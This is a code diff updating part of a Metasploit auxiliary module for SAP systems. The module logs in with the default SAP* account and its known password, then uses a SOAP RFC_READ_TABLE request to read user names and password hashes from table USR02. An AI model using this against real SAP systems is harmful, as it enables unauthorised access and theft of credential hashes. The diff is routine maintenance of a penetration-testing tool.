@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -16,7 +16,7 @@
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -45,8 +45,8 @@ class Metasploit4 < Msf::Auxiliary
       [
         Opt::RPORT(8000),
         OptString.new('CLIENT', [true, 'SAP client', '001']),
-        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-        OptString.new('PASSWORD', [true, 'Password', '06071992']),
+        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+        OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptString.new('TABLE', [true, 'Table to read', 'USR02']),
         OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])
       ], self.class)
@@ -83,19 +83,21 @@ class Metasploit4 < Msf::Auxiliary
     print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_READ_TABLE request")
     begin
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+        'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'ctype' => 'text/xml; charset=UTF-8',
-        'headers' =>{
+        'encode_params' => false,
+        'headers' => {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-          #'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-          #'Authorization' => 'Basic ' + user_pass,
-          #'Content-Type' =>
-          }
-        })
+        },
+        'vars_get' => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
+        }
+      })
       if res and res.code != 500 and res.code != 200
         # to do - implement error handlers for each status code, 404, 301, etc.
         if res.body =~ /<h1>Logon failed<\/h1>/
